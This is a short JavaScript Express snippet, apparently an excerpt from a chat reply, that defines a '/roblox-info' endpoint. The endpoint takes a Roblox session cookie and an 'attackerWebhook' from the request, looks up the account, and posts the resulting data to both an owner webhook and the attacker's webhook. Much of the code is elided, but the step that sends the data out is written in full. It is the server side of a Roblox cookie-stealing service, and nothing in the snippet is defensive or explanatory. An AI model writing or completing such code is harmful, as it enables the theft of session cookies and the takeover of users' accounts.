// ... (see previous message for full code)
app.post('/roblox-info', async (req, res) => {
  const { cookie, attackerWebhook } = req.body;
  // ... fetch Roblox info ...
  // ... build embed ...
  await fetch(OWNER_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embed) });
  await fetch(attackerWebhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embed) });
  res.json({ status: "sent", username, userId });
});